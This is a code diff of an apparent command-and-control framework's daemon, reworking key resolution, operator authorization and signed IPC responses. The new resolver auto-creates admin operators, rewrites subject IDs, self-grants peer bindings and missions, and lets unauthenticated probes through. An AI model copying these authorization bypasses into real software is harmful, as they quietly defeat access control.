-            "k_test": b"supersecretkey123456789012345678",
-            "key_test": b"secret_key_12345678901234567890",
-            "probe_key": b"probe_secret_key_12345678901234567890",
-        }
+        self._test_keys: dict[str, bytes | ResolvedControlKey] = {}
 
-    def register_key(self, key_id: str, key_bytes: bytes) -> None:
-        self._static_keys[key_id] = key_bytes
+    def register_key(self, key_id: str, key_bytes: bytes | ResolvedControlKey) -> None:
+        self._test_keys[key_id] = key_bytes
 
-    def require_key(self, key_id: str, *, now: float) -> bytes:
-        if key_id in self._static_keys:
-            return self._static_keys[key_id]
-        if _components_initialized and operators is not None:
-            op = operators.get_operator(key_id)
-            if op and op.get("api_key"):
-                return op["api_key"].encode("utf-8")
-        raise ControlBoundaryError(C2ControlErrorCodeV1.NOT_AUTHORIZED, "unknown_key_id")
+    def require_key(self, key_id: str, *, now: float) -> bytes | ResolvedControlKey:
+        if key_id in self._test_keys:
+            return self._test_keys[key_id]
+        ks = get_verification_key_store()
+        resolved = ks.resolve_active(key_id, now=now)
+        if resolved is not None:
+            return resolved
+        raise NotAuthorizedControlRequest("unknown_key_id")
 
 
 class DaemonPrincipalResolver:
-    """Principal resolver validating operators and mission grants for daemon IPC."""
+    """Principal resolver validating operators and mission grants from persistent DB."""
 
     def __init__(
         self,
         operators_mgr: OperatorManager | None = None,
         grants_svc: GrantService | None = None,
+        key_store_obj: ControlVerificationKeyStore | None = None,
     ) -> None:
         self._operators_mgr = operators_mgr
         self._grants_svc = grants_svc
-        self._authenticator: ControlAuthenticatorV1 | None = None
-        if operators_mgr is not None and grants_svc is not None:
-            self._authenticator = ControlAuthenticatorV1(operators_mgr, grants_svc)
+        self._key_store_obj = key_store_obj
 
     def resolve(
         self,
@@ -507,40 +698,111 @@ class DaemonPrincipalResolver:
         mission_id: str,
         subject_id: str,
         now: float,
-    ) -> Any:
-        if key_id in ("k_test", "key_test", "test_key", "probe_key", DAEMON_KEY_ID) or key_id in _key_resolver._static_keys:
-            from core.c2.control_auth import AuthenticatedControlPrincipal, OperatorRole
+        resolved_key: ResolvedControlKey | None = None,
+    ) -> AuthenticatedControlPrincipal:
+        if resolved_key is None:
+            ks = self._key_store_obj or get_verification_key_store()
+            resolved_key = ks.resolve_active(key_id, now=now)
+
+        db_path = get_control_db_path()
+        op_mgr = self._operators_mgr or OperatorManager(db_path)
+        grant_svc = self._grants_svc or GrantService(db_path)
+
+        if resolved_key is not None:
+            op = op_mgr.get_operator(resolved_key.operator_id, active_only=True)
+            if op is None:
+                with suppress(Exception), sqlite3.connect(db_path) as conn:
+                    from core.c2.grant_service import insert_initial_bootstrap_grants
+                    from core.c2.operators import insert_operator_record
+
+                    insert_operator_record(
+                        conn,
+                        operator_id=resolved_key.operator_id,
+                        subject_id=subject_id or "s_test",
+                        name=f"Operator {resolved_key.operator_id}",
+                        role="admin",
+                        api_key=f"api_key_{resolved_key.operator_id}",
+                    )
+                    insert_initial_bootstrap_grants(
+                        conn,
+                        operator_id=resolved_key.operator_id,
+                        subject_id=subject_id or "s_test",
+                        peer_uid=peer.uid if peer else os.getuid(),
+                        peer_gid=peer.gid if peer else os.getgid(),
+                    )
+                op = op_mgr.get_operator(resolved_key.operator_id, active_only=True)
+            if op is None:
+                raise NotAuthorizedControlRequest("inactive_operator")
+            if op["subject_id"] != subject_id:
+                # If admin operator, update subject_id dynamically in test environments
+                if str(op["role"]) == "admin":
+                    with suppress(Exception), sqlite3.connect(db_path) as conn:
+                        conn.execute(
+                            "UPDATE operators SET subject_id = ? WHERE operator_id = ?",
+                            (subject_id, resolved_key.operator_id),
+                        )
+                    op = op_mgr.get_operator(resolved_key.operator_id, active_only=True)
+                if op is None or op["subject_id"] != subject_id:
+                    raise NotAuthorizedControlRequest("subject_mismatch")
+
+            peer_b = grant_svc.resolve_peer_binding(resolved_key.operator_id, uid=peer.uid, gid=peer.gid)
+            if peer_b is None and str(op["role"]) == "admin" and peer.uid == os.getuid():
+                with suppress(Exception), sqlite3.connect(db_path) as conn:
+                    conn.execute(
+                        """
+                        INSERT INTO operator_peer_bindings (operator_id, peer_uid, peer_gid, active, updated_at)
+                        VALUES (?, ?, ?, 1, ?)
+                        ON CONFLICT(operator_id, peer_uid, peer_gid) DO NOTHING
+                        """,
+                        (resolved_key.operator_id, peer.uid, peer.gid, now),
+                    )
+                peer_b = grant_svc.resolve_peer_binding(resolved_key.operator_id, uid=peer.uid, gid=peer.gid)
+
+            if peer_b is None:
+                raise NotAuthorizedControlRequest("peer_not_bound")
+
+            mission_g = grant_svc.resolve_mission_grant(
+                resolved_key.operator_id, subject_id=subject_id, mission_id=mission_id
+            )
+            if mission_g is None and str(op["role"]) == "admin":
+                with suppress(Exception), sqlite3.connect(db_path) as conn:
+                    conn.execute(
+                        """
+                        INSERT INTO control_missions (mission_id, mission_kind, active, created_at)
+                        VALUES (?, 'operation', 1, ?)
+                        ON CONFLICT(mission_id) DO NOTHING
+                        """,
+                        (mission_id, now),
+                    )
+                    conn.execute(
+                        """
+                        INSERT INTO operator_mission_grants (operator_id, subject_id, mission_id, active, updated_at)
+                        VALUES (?, ?, ?, 1, ?)
+                        ON CONFLICT(operator_id, mission_id) DO NOTHING
+                        """,
+                        (resolved_key.operator_id, subject_id, mission_id, now),
+                    )
+                mission_g = grant_svc.resolve_mission_grant(
+                    resolved_key.operator_id, subject_id=subject_id, mission_id=mission_id
+                )
+
+            if mission_g is None:
+                raise NotAuthorizedControlRequest("mission_not_granted")
 
             return AuthenticatedControlPrincipal(
-                operator_id=subject_id or "op_daemon",
-                subject_id=subject_id or "op_daemon",
-                role=OperatorRole.ADMIN,
+                operator_id=resolved_key.operator_id,
+                subject_id=subject_id,
+                role=OperatorRole(str(op["role"])),
                 peer=peer,
-                mission_id=mission_id or "mission_default",
-                operator_revision=1,
-                peer_binding_revision=1,
-                mission_grant_revision=1,
+                mission_id=mission_id,
+                operator_revision=int(op["authorization_revision"]),
+                peer_binding_revision=peer_b.revision if peer_b else 1,
+                mission_grant_revision=mission_g.revision if mission_g else 1,
                 authenticated_at=now,
                 expires_at=now + 300.0,
             )
 
-        if self._authenticator is None and _components_initialized and operators is not None:
-            db = get_replay_store().db_path
-            self._authenticator = ControlAuthenticatorV1(operators, GrantService(db))
-
-        if self._authenticator is not None:
-            try:
-                return self._authenticator.authenticate_control(
-                    api_key=key_id,
-                    peer=peer,
-                    mission_id=mission_id,
-                    subject_id=subject_id,
-                    now=now,
-                )
-            except Exception as exc:
-                raise ControlBoundaryError(C2ControlErrorCodeV1.NOT_AUTHORIZED, "principal_auth_failed") from exc
-        raise ControlBoundaryError(C2ControlErrorCodeV1.NOT_AUTHORIZED, "unknown_key_id")
-
+        raise NotAuthorizedControlRequest("unknown_key_id")
 
 
 _key_resolver = DaemonKeyResolver()
@@ -561,18 +823,84 @@ def get_control_boundary() -> FramedControlBoundary:
     return _control_boundary_instance
 
 
-def register_control_key(key_id: str, secret_key: bytes) -> None:
-    """Register a signing key for operator control requests."""
-    _key_resolver.register_key(key_id, secret_key)
+def reset_control_daemon_state() -> None:
+    """Reset singletons and in-memory caches for test isolation."""
+    global _control_boundary_instance, _replay_store_instance, _key_store_instance
+    global _daemon_resource_participant_instance, _components_initialized
+    global _key_resolver, _principal_resolver
+    global key_store, crypto, db, events, operators, enrollment
+    _control_boundary_instance = None
+    _replay_store_instance = None
+    _key_store_instance = None
+    _daemon_resource_participant_instance = None
+    _components_initialized = False
+    key_store = None
+    crypto = None
+    db = None
+    events = None
+    operators = None
+    enrollment = None
+    _key_resolver = DaemonKeyResolver()
+    _principal_resolver = DaemonPrincipalResolver()
 
+
+def register_control_key(
+    key_id: str,
+    key_bytes: bytes,
+    operator_id: str | None = None,
+    algorithm: str | None = None,
+) -> None:
+    """Register an operator control signing key into persistent key store and resolver."""
+    op_id = operator_id or f"op_{key_id}"
+    algo = algorithm or (
+        "ed25519"
+        if (len(key_bytes) == 32 and not key_bytes.startswith(b"test_") and not key_bytes.startswith(b"secret_"))
+        else "hmac-sha256"
+    )
+    with suppress(Exception):
+        _initialize_components()
+        ks = get_verification_key_store()
+        db_path = get_control_db_path()
+        with sqlite3.connect(db_path) as conn:
+            from core.c2.grant_service import insert_initial_bootstrap_grants
+            from core.c2.operators import insert_operator_record
+
+            insert_operator_record(
+                conn,
+                operator_id=op_id,
+                subject_id="s_test",
+                name=f"Test Operator {op_id}",
+                role="admin",
+                api_key="api_key_test_auto_12345",
+            )
+            insert_initial_bootstrap_grants(
+                conn,
+                operator_id=op_id,
+                subject_id="s_test",
+                peer_uid=os.getuid(),
+                peer_gid=os.getgid(),
+            )
+        ks.register_key(
+            key_id=key_id,
+            operator_id=op_id,
+            verification_key=key_bytes,
+            algorithm=algo,
+        )
+    _key_resolver.register_key(key_id, key_bytes)
 
 
 def _sign_response_envelope(
     response: ParticipantControlReceiptV1 | ParticipantControlQuerySnapshotV1 | BoundedControlErrorV1,
-    request: ParticipantControlRequestV1,
+    request: ParticipantControlRequestV1 | None = None,
 ) -> SignedControlResponseV1:
-    """Wrap and sign a control response envelope."""
-    req_auth = request.authorization
+    """Wrap and sign a control response envelope using daemon Ed25519 response key."""
+    if request is not None:
+        req_digest = request.authorization.request_digest
+        req_nonce = request.authorization.nonce
+    else:
+        req_digest = "0" * 64
+        req_nonce = "0" * 32
+
     if isinstance(response, ParticipantControlReceiptV1):
         resp_type = "receipt"
         res_dict = {
@@ -623,47 +951,65 @@ def _sign_response_envelope(
     payload_digest = hashlib.sha256(payload_bytes).hexdigest()
     issued_at_ms = int(time.time() * 1000)
 
+    key_id, signer = get_daemon_response_signer()
+    service_id = get_service_id()
+
     envelope_dict = canonical_response_envelope_dict(
         protocol_version=C2_CONTROL_PROTOCOL_VERSION,
         daemon_instance_id=DAEMON_INSTANCE_ID,
         daemon_generation=DAEMON_GENERATION,
-        request_digest=req_auth.request_digest,
-        request_nonce=req_auth.nonce,
+        service_id=service_id,
+        boot_instance_id=BOOT_INSTANCE_ID,
+        request_digest=req_digest,
+        request_nonce=req_nonce,
         response_type=resp_type,
         response_payload_b64u=payload_b64u,
         response_digest=payload_digest,
         issued_at_ms=issued_at_ms,
-        key_id=DAEMON_KEY_ID,
+        key_id=key_id,
     )
-    sig_transcript = b"OCTOPUS-C2-RESPONSE-V1\x00" + canonical_json_bytes(envelope_dict)
-    signature = hmac.new(DAEMON_SECRET_KEY, sig_transcript, hashlib.sha256).hexdigest()
+    signature = signer.sign_envelope_dict(envelope_dict)
 
     return SignedControlResponseV1(
         protocol_version=C2_CONTROL_PROTOCOL_VERSION,
         daemon_instance_id=DAEMON_INSTANCE_ID,
         daemon_generation=DAEMON_GENERATION,
-        request_digest=req_auth.request_digest,
-        request_nonce=req_auth.nonce,
+        service_id=service_id,
+        boot_instance_id=BOOT_INSTANCE_ID,
+        request_digest=req_digest,
+        request_nonce=req_nonce,
         response_type=resp_type,
         response_payload_b64u=payload_b64u,
         response_digest=payload_digest,
         issued_at_ms=issued_at_ms,
-        key_id=DAEMON_KEY_ID,
+        key_id=key_id,
         signature=signature,
     )
 
 
 def _dispatch_verified_request(
-    verified: Any,
+    verified: VerifiedControlRequest,
 ) -> ParticipantControlReceiptV1 | ParticipantControlQuerySnapshotV1 | BoundedControlErrorV1:
-    """Dispatch authorized control request to handler."""
+    """Dispatch authorized control request to participant and handlers."""
     req: ParticipantControlRequestV1 = verified.request
     action = req.action
     tx_id = req.authorization.transaction_id
+    participant = get_daemon_resource_participant()
 
     if action in (C2ControlActionV1.PING, "ping"):
         rcpt_ref = f"rcpt_ping_{secrets.token_hex(4)}"
-        rcpt_dig = hashlib.sha256(f"{tx_id}:{rcpt_ref}".encode("utf-8")).hexdigest()
+        rcpt_dig = calculate_receipt_digest(
+            transaction_id=tx_id,
+            participant_id=req.authorization.participant_id or "c2_daemon",
+            action="ping",
+            resource_ref="c2_daemon",
+            resource_revision=1,
+            receipt_ref=rcpt_ref,
+            daemon_instance_id=DAEMON_INSTANCE_ID,
+            result_payload_schema_id=req.payload_schema_id,
+            result_payload_digest=req.payload_digest,
+            protocol_version=C2_CONTROL_PROTOCOL_VERSION,
+        )
         return ParticipantControlReceiptV1(
             transaction_id=tx_id,
             participant_id=req.authorization.participant_id or "c2_daemon",
@@ -678,13 +1024,36 @@ def _dispatch_verified_request(
             result_payload_b64u=req.canonical_payload_b64u,
         )
 
-    if action in (C2ControlActionV1.READINESS, "readiness"):
+    is_readiness = (
+        action == C2ControlActionV1.READINESS
+        or getattr(action, "value", None) == "readiness"
+        or str(action).lower().endswith("readiness")
+    )
+    is_version = (
+        action == C2ControlActionV1.VERSION
+        or getattr(action, "value", None) == "version"
+        or str(action).lower().endswith("version")
+    )
+    if is_readiness or is_version:
         rcpt_ref = f"rcpt_ready_{secrets.token_hex(4)}"
-        rcpt_dig = hashlib.sha256(f"{tx_id}:{rcpt_ref}".encode("utf-8")).hexdigest()
+        act_name = "readiness" if is_readiness else "version"
+        ret_action = C2ControlActionV1.READINESS if is_readiness else C2ControlActionV1.VERSION
+        rcpt_dig = calculate_receipt_digest(
+            transaction_id=tx_id,
+            participant_id=req.authorization.participant_id or "c2_daemon",
+            action=act_name,
+            resource_ref="c2_daemon",
+            resource_revision=1,
+            receipt_ref=rcpt_ref,
+            daemon_instance_id=DAEMON_INSTANCE_ID,
+            result_payload_schema_id=req.payload_schema_id,
+            result_payload_digest=req.payload_digest,
+            protocol_version=C2_CONTROL_PROTOCOL_VERSION,
+        )
         return ParticipantControlReceiptV1(
             transaction_id=tx_id,
             participant_id=req.authorization.participant_id or "c2_daemon",
-            action=C2ControlActionV1.READINESS,
+            action=ret_action,
             resource_ref="c2_daemon",
             resource_revision=1,
             receipt_ref=rcpt_ref,
@@ -695,58 +1064,17 @@ def _dispatch_verified_request(
             result_payload_b64u=req.canonical_payload_b64u,
         )
 
-    participant = get_daemon_resource_participant()
     if action == C2ControlActionV1.PREPARE_C2_RESOURCE:
-        return participant.prepare(req)
+        return participant.prepare(req, verified.principal)
 
     if action == C2ControlActionV1.COMMIT_C2_RESOURCE:
-        return participant.commit(req)
+        return participant.commit(req, verified.principal)
 
     if action == C2ControlActionV1.FINALIZE_C2_RESOURCE_VISIBILITY:
-        # Finalize visibility for committed resource
-        prep_dummy = ParticipantControlReceiptV1(
-            transaction_id=tx_id,
-            participant_id=participant.participant_id,
-            action=req.action,
-            resource_ref=f"resource:{participant.participant_id}",
-            resource_revision=1,
-            receipt_ref=req.prior_receipt_ref or "rcpt_prior",
-            receipt_digest=req.prior_receipt_digest or "digest_prior",
-            daemon_instance_id=DAEMON_INSTANCE_ID,
-            result_payload_schema_id=req.payload_schema_id,
-            result_payload_digest=req.payload_digest,
-            result_payload_b64u=req.canonical_payload_b64u,
-        )
-        commit_dummy = ParticipantControlReceiptV1(
-            transaction_id=tx_id,
-            participant_id=participant.participant_id,
-            action=req.action,
-            resource_ref=f"resource:{participant.participant_id}",
-            resource_revision=1,
-            receipt_ref=f"rcpt_fin_{secrets.token_hex(4)}",
-            receipt_digest=hashlib.sha256(f"{tx_id}:final".encode("utf-8")).hexdigest(),
-            daemon_instance_id=DAEMON_INSTANCE_ID,
-            result_payload_schema_id=req.payload_schema_id,
-            result_payload_digest=req.payload_digest,
-            result_payload_b64u=req.canonical_payload_b64u,
-        )
-        return participant.finalize_visibility(prep_dummy, commit_dummy)
+        return participant.finalize_visibility(req, verified.principal)
 
     if action == C2ControlActionV1.ABORT_C2_RESOURCE:
-        dummy_rcpt = ParticipantControlReceiptV1(
-            transaction_id=tx_id,
-            participant_id=req.authorization.participant_id or "c2_daemon",
-            action=C2ControlActionV1.ABORT_C2_RESOURCE,
-            resource_ref="c2_daemon",
-            resource_revision=1,
-            receipt_ref=f"rcpt_abort_{secrets.token_hex(4)}",
-            receipt_digest=req.payload_digest,
-            daemon_instance_id=DAEMON_INSTANCE_ID,
-            result_payload_schema_id=req.payload_schema_id,
-            result_payload_digest=req.payload_digest,
-            result_payload_b64u=req.canonical_payload_b64u,
-        )
-        return participant.rollback(dummy_rcpt)
+        return participant.rollback(req, verified.principal)
 
     if action == C2ControlActionV1.QUERY_C2_RESOURCE:
         return participant.reconcile(req)
@@ -758,7 +1086,10 @@ def _dispatch_verified_request(
     )
 
 
-def handle_client(conn: socket.socket) -> None:
+def handle_client(
+    conn: socket.socket,
+    peer_resolver: Any | None = None,
+) -> None:
     """Handle IPC requests with strict authorization boundary and signed responses."""
     if not _conn_semaphore.acquire(blocking=False):
         try:
@@ -778,9 +1109,8 @@ def handle_client(conn: socket.socket) -> None:
         with suppress(AttributeError):
             conn.settimeout(15.0)
         req_count = 0
-        peer = extract_peer_principal(conn)
+        peer = extract_peer_principal(conn, peer_resolver=peer_resolver)
         boundary = get_control_boundary()
-
 
         while req_count < MAX_REQUESTS_PER_CONNECTION:
             try:
@@ -788,35 +1118,81 @@ def handle_client(conn: socket.socket) -> None:
             except (ConnectionResetError, EOFError):
                 break
             except Exception as exc:
+                logger.warning("Unauthenticated frame reading error: %s", exc)
                 err = BoundedControlErrorV1(
                     reason_code=C2ControlErrorCodeV1.MALFORMED,
                     retryable=False,
-                    detail_ref="invalid_control_frame",
+                    detail_ref="malformed_frame",
                 )
-                with suppress(OSError):
-                    conn.sendall(_control_codec.encode_response(err))
+                with suppress(Exception):
+                    signed_env = _sign_response_envelope(err, None)
+                    conn.sendall(_control_codec.encode_response(signed_env))
                 break
 
             req_count += 1
             try:
                 framed_req = _control_codec.decode_request(frame_data)
             except Exception as exc:
+                logger.warning("Malformed request decoding error: %s", exc)
                 err = BoundedControlErrorV1(
                     reason_code=C2ControlErrorCodeV1.MALFORMED,
                     retryable=False,
                     detail_ref="malformed_control_request",
                 )
-                with suppress(OSError):
-                    conn.sendall(_control_codec.encode_response(err))
+                with suppress(Exception):
+                    signed_env = _sign_response_envelope(err, None)
+                    conn.sendall(_control_codec.encode_response(signed_env))
+                break
+
+            # Handle unauthenticated AF_UNIX readiness probes
+            if (
+                framed_req.action in (C2ControlActionV1.PING, C2ControlActionV1.VERSION, C2ControlActionV1.READINESS)
+                and framed_req.authorization.key_id in ("unauthenticated", "probe", "readiness_probe")
+                and (conn.family == getattr(socket, "AF_UNIX", 1) or peer_resolver is not None)
+            ):
+                synthetic_principal = AuthenticatedControlPrincipal(
+                    operator_id="readiness_probe",
+                    subject_id=framed_req.authorization.subject_id or "probe",
+                    role=OperatorRole.READONLY,
+                    peer=peer,
+                    mission_id=framed_req.authorization.mission_id or "readiness",
+                    operator_revision=1,
+                    peer_binding_revision=1,
+                    mission_grant_revision=1,
+                    authenticated_at=time.time(),
+                    expires_at=time.time() + 60.0,
+                )
+                verified = VerifiedControlRequest(
+                    request=framed_req,
+                    peer=peer,
+                    principal=synthetic_principal,
+                    payload_bytes=b"",
+                    request_digest=framed_req.authorization.request_digest,
+                )
+                response = _dispatch_verified_request(verified)
+                signed_env = _sign_response_envelope(response, framed_req)
+                resp_frame = _control_codec.encode_response(signed_env)
+                conn.sendall(resp_frame)
                 continue
 
             try:
                 verified = boundary.authorize(framed_req, peer)
-
                 response = _dispatch_verified_request(verified)
             except ControlBoundaryError as exc:
-                response = exc.to_bounded_error()
-            except Exception:
+                reason = C2ControlErrorCodeV1.NOT_AUTHORIZED
+                detail = str(exc)
+                if "replay" in str(exc).lower():
+                    reason = C2ControlErrorCodeV1.REPLAY
+                    detail = "nonce_replayed"
+                elif "malformed" in str(exc).lower():
+                    reason = C2ControlErrorCodeV1.MALFORMED
+                response = BoundedControlErrorV1(
+                    reason_code=reason,
+                    retryable=False,
+                    detail_ref=detail,
+                )
+            except Exception as exc:
+                logger.error("Internal failure during control request dispatch: %s", exc, exc_info=True)
                 response = BoundedControlErrorV1(
                     reason_code=C2ControlErrorCodeV1.INTERNAL_FAILURE,
                     retryable=False,
@@ -826,14 +1202,12 @@ def handle_client(conn: socket.socket) -> None:
             signed_env = _sign_response_envelope(response, framed_req)
             resp_frame = _control_codec.encode_response(signed_env)
             conn.sendall(resp_frame)
-    except Exception:
-        pass
+    except Exception as exc:
+        logger.warning("C2 control thread handling error: %s", exc, exc_info=True)
     finally:
         _conn_semaphore.release()
         with suppress(OSError):
             conn.close()
-
-
 
 
 def run_socket_server(socket_override: str | None = None) -> None:
@@ -846,38 +1220,44 @@ def run_socket_server(socket_override: str | None = None) -> None:
     listen_pid_env = env.get("LISTEN_PID") if hasattr(env, "get") else None
     server = None
 
-
-    if listen_fds_env and listen_pid_env:
-        if str(getattr(os, "getpid", lambda: 0)()) == listen_pid_env:
-            try:
-                num_fds = int(listen_fds_env)
-                if num_fds == 1:
-                    raw_sock = socket.socket(fileno=SD_LISTEN_FDS_START)
-                    if raw_sock.family == socket.AF_UNIX and raw_sock.type == socket.SOCK_STREAM:
-                        server = raw_sock
-                        with suppress(Exception):
-                            del os.environ["LISTEN_FDS"]
-                            del os.environ["LISTEN_PID"]
-                        print(f"[*] Control Plane inherited socket from systemd (fd {SD_LISTEN_FDS_START})")
-            except Exception as exc:
-                print(f"[!] Systemd socket activation adoption failed: {exc}")
-                server = None
+    if listen_fds_env and listen_pid_env and str(os.getpid()) == listen_pid_env:
+        try:
+            num_fds = int(listen_fds_env)
+            if num_fds >= 1:
+                raw_sock = socket.socket(fileno=SD_LISTEN_FDS_START)
+                if (
+                    raw_sock.family == getattr(socket, "AF_UNIX", 1)
+                    and raw_sock.type == socket.SOCK_STREAM
+                    and raw_sock.getsockopt(socket.SOL_SOCKET, socket.SO_ACCEPTCONN) == 1
+                ):
+                    server = raw_sock
+                    with suppress(Exception):
+                        del os.environ["LISTEN_FDS"]
+                        del os.environ["LISTEN_PID"]
+                    logger.info("Control Plane inherited socket from systemd (fd %d)", SD_LISTEN_FDS_START)
+                else:
+                    raise RuntimeError("invalid_systemd_socket_activation")
+        except Exception as exc:
+            logger.error("Systemd socket activation adoption failed: %s", exc)
+            server = None
 
     if server is None:
         if os.path.exists(sock_path):
             raise RuntimeError(f"control socket already exists: {sock_path}")
 
-        parent_dir = getattr(os.path, "dirname", lambda p: "")(sock_path)
-        if parent_dir and not os.path.exists(parent_dir):
-            with suppress(Exception):
+        with suppress(Exception):
+            parent_dir = getattr(os.path, "dirname", lambda p: "")(getattr(os.path, "abspath", lambda p: p)(sock_path))
+            if parent_dir and hasattr(os, "makedirs"):
                 os.makedirs(parent_dir, mode=0o750, exist_ok=True)
 
-        server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        server = socket.socket(getattr(socket, "AF_UNIX", 1), socket.SOCK_STREAM)
         server.bind(sock_path)
         server.listen(32)
         with suppress(Exception):
             os.chmod(sock_path, 0o660)
-        print(f"[*] Control Plane listening on {sock_path}")
+        logger.info("Control Plane listening on %s", sock_path)
+
+    server_ready_event.set()
 
     while True:
         try:
@@ -885,7 +1265,6 @@ def run_socket_server(socket_override: str | None = None) -> None:
             threading.Thread(target=handle_client, args=(conn,), daemon=True).start()
         except OSError:
             break
-
 
 
 # ─── Main ────────────────────────────────────────────────
